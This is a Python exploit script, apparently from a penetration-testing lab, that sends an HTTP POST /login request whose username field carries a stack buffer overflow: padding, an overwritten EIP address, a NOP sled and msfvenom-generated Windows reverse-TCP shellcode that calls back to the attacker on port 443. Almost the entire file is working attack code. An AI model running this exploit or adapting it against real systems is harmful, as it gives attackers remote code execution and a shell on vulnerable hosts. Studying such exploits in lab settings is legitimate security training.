#!/usr/bin/python3

import socket
import time
import sys

## msfvenom -p windows/shell/reverse_tcp -b "\x00\x0a\x0d\x25\x26\x3d" LHOST=tun0 LPORT=443 EXITFUNC=thread -f py
# shell =  b""
# shell += b"\xda\xdf\xd9\x74\x24\xf4\x5f\xb8\x82\x31\xbf\xa0\x31"
# shell += b"\xc9\xb1\x52\x31\x47\x17\x83\xef\xfc\x03\xc5\x22\x5d"
# shell += b"\x55\x35\xac\x23\x96\xc5\x2d\x44\x1e\x20\x1c\x44\x44"
# shell += b"\x21\x0f\x74\x0e\x67\xbc\xff\x42\x93\x37\x8d\x4a\x94"
# shell += b"\xf0\x38\xad\x9b\x01\x10\x8d\xba\x81\x6b\xc2\x1c\xbb"
# shell += b"\xa3\x17\x5d\xfc\xde\xda\x0f\x55\x94\x49\xbf\xd2\xe0"
# shell += b"\x51\x34\xa8\xe5\xd1\xa9\x79\x07\xf3\x7c\xf1\x5e\xd3"
# shell += b"\x7f\xd6\xea\x5a\x67\x3b\xd6\x15\x1c\x8f\xac\xa7\xf4"
# shell += b"\xc1\x4d\x0b\x39\xee\xbf\x55\x7e\xc9\x5f\x20\x76\x29"
# shell += b"\xdd\x33\x4d\x53\x39\xb1\x55\xf3\xca\x61\xb1\x05\x1e"
# shell += b"\xf7\x32\x09\xeb\x73\x1c\x0e\xea\x50\x17\x2a\x67\x57"
# shell += b"\xf7\xba\x33\x7c\xd3\xe7\xe0\x1d\x42\x42\x46\x21\x94"
# shell += b"\x2d\x37\x87\xdf\xc0\x2c\xba\x82\x8c\x81\xf7\x3c\x4d"
# shell += b"\x8e\x80\x4f\x7f\x11\x3b\xc7\x33\xda\xe5\x10\x33\xf1"
# shell += b"\x52\x8e\xca\xfa\xa2\x87\x08\xae\xf2\xbf\xb9\xcf\x98"
# shell += b"\x3f\x45\x1a\x0e\x6f\xe9\xf5\xef\xdf\x49\xa6\x87\x35"
# shell += b"\x46\x99\xb8\x36\x8c\xb2\x53\xcd\x47\x7d\x0b\xba\x44"
# shell += b"\x15\x4e\x44\x6a\x5d\xc7\xa2\x06\xb1\x8e\x7d\xbf\x28"
# shell += b"\x8b\xf5\x5e\xb4\x01\x70\x60\x3e\xa6\x85\x2f\xb7\xc3"
# shell += b"\x95\xd8\x37\x9e\xc7\x4f\x47\x34\x6f\x13\xda\xd3\x6f"
# shell += b"\x5a\xc7\x4b\x38\x0b\x39\x82\xac\xa1\x60\x3c\xd2\x3b"
# shell += b"\xf4\x07\x56\xe0\xc5\x86\x57\x65\x71\xad\x47\xb3\x7a"
# shell += b"\xe9\x33\x6b\x2d\xa7\xed\xcd\x87\x09\x47\x84\x74\xc0"
# shell += b"\x0f\x51\xb7\xd3\x49\x5e\x92\xa5\xb5\xef\x4b\xf0\xca"
# shell += b"\xc0\x1b\xf4\xb3\x3c\xbc\xfb\x6e\x85\xdc\x19\xba\xf0"
# shell += b"\x74\x84\x2f\xb9\x18\x37\x9a\xfe\x24\xb4\x2e\x7f\xd3"
# shell += b"\xa4\x5b\x7a\x9f\x62\xb0\xf6\xb0\x06\xb6\xa5\xb1\x02"

# msfvenom -p windows/shell_reverse_tcp -b "\x00\x0a\x0d\x25\x26\x3d" LHOST=tun0 LPORT=443 EXITFUNC=thread -f py -v shell
shell =  b""
shell += b"\xdb\xdd\xd9\x74\x24\xf4\xba\x79\x4a\x2f\xe1\x5d"
shell += b"\x2b\xc9\xb1\x52\x83\xed\xfc\x31\x55\x13\x03\x2c"
shell += b"\x59\xcd\x14\x32\xb5\x93\xd7\xca\x46\xf4\x5e\x2f"
shell += b"\x77\x34\x04\x24\x28\x84\x4e\x68\xc5\x6f\x02\x98"
shell += b"\x5e\x1d\x8b\xaf\xd7\xa8\xed\x9e\xe8\x81\xce\x81"
shell += b"\x6a\xd8\x02\x61\x52\x13\x57\x60\x93\x4e\x9a\x30"
shell += b"\x4c\x04\x09\xa4\xf9\x50\x92\x4f\xb1\x75\x92\xac"
shell += b"\x02\x77\xb3\x63\x18\x2e\x13\x82\xcd\x5a\x1a\x9c"
shell += b"\x12\x66\xd4\x17\xe0\x1c\xe7\xf1\x38\xdc\x44\x3c"
shell += b"\xf5\x2f\x94\x79\x32\xd0\xe3\x73\x40\x6d\xf4\x40"
shell += b"\x3a\xa9\x71\x52\x9c\x3a\x21\xbe\x1c\xee\xb4\x35"
shell += b"\x12\x5b\xb2\x11\x37\x5a\x17\x2a\x43\xd7\x96\xfc"
shell += b"\xc5\xa3\xbc\xd8\x8e\x70\xdc\x79\x6b\xd6\xe1\x99"
shell += b"\xd4\x87\x47\xd2\xf9\xdc\xf5\xb9\x95\x11\x34\x41"
shell += b"\x66\x3e\x4f\x32\x54\xe1\xfb\xdc\xd4\x6a\x22\x1b"
shell += b"\x1a\x41\x92\xb3\xe5\x6a\xe3\x9a\x21\x3e\xb3\xb4"
shell += b"\x80\x3f\x58\x44\x2c\xea\xcf\x14\x82\x45\xb0\xc4"
shell += b"\x62\x36\x58\x0e\x6d\x69\x78\x31\xa7\x02\x13\xc8"
shell += b"\x20\xed\x4c\xa5\x63\x85\x8e\x49\x85\xed\x06\xaf"
shell += b"\xef\x01\x4f\x78\x98\xb8\xca\xf2\x39\x44\xc1\x7f"
shell += b"\x79\xce\xe6\x80\x34\x27\x82\x92\xa1\xc7\xd9\xc8"
shell += b"\x64\xd7\xf7\x64\xea\x4a\x9c\x74\x65\x77\x0b\x23"
shell += b"\x22\x49\x42\xa1\xde\xf0\xfc\xd7\x22\x64\xc6\x53"
shell += b"\xf9\x55\xc9\x5a\x8c\xe2\xed\x4c\x48\xea\xa9\x38"
shell += b"\x04\xbd\x67\x96\xe2\x17\xc6\x40\xbd\xc4\x80\x04"
shell += b"\x38\x27\x13\x52\x45\x62\xe5\xba\xf4\xdb\xb0\xc5"
shell += b"\x39\x8c\x34\xbe\x27\x2c\xba\x15\xec\x4c\x59\xbf"
shell += b"\x19\xe5\xc4\x2a\xa0\x68\xf7\x81\xe7\x94\x74\x23"
shell += b"\x98\x62\x64\x46\x9d\x2f\x22\xbb\xef\x20\xc7\xbb"
shell += b"\x5c\x40\xc2"

padSize = 780
bufSize = 1500
rhost = "192.168.211.10"
rport = 80

print ( "\nCreating input" )
padding = b"A" * padSize
#eip = b"B" * 4 
eip = b"\x83\x0c\x09\x10"
offset = b"\x83\x0c\x09\x10"
nopsled = b"\x90" * (bufSize - padSize - len(eip) - len(offset) - len(shell))

payload = padding + eip + offset + nopsled + shell
content = b"username=" + payload + b"&password=ZzZ"

header  = b"POST /login HTTP/1.1\r\n"
header += b"Host: " + str.encode(rhost) + b"\r\n"
header += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
header += b"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
header += b"Accept-Language: en-US,en;q=0.5\r\n"
header += b"Referer: http://" + str.encode(rhost) + b"/login\r\n"
header += b"Connection: close\r\n"
header += b"Content-Type: application/x-www-form-urlencoded\r\n"
header += b"Content-Length: " + str.encode(str( len( content ) ) ) + b"\r\n"
header += b"\r\n"

print ( "\nPadding: " + str(len(padding)) + " EIP: " + str(eip) + " // " + str(len(eip)) + " Offset: " + "NM" + " // " + "0" )
print ( "\nNOP Sled: " + str(len(nopsled)) + " Shell: " + str(len(shell)) + " Payload Total: " + str( len(padding) + len(eip) + len(nopsled) + len(shell) ) + " bytes")
print ( b"\nHeader: " + str.encode(str(len(header))) + b"\n" + header )
print ( "\nTransfer Total: " + str( len(header) ) + " header + " + str( len(content) ) + " content bytes" )

sendBuffer = header + content
print ( "\nCreating buffer of %s length" % str(len(sendBuffer) ) )

try:
    print ( "\nCreating socket" )
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print ( "\nConnecting socket" )
    s.connect((rhost,rport))
    print ( "\nSending buffer with %s bytes" % len(sendBuffer) )
    s.send( sendBuffer )
    print ( "\nClosing socket" )
    s.close()
except:
    print ( "Error while manipulating socket" )
    sys.exit()
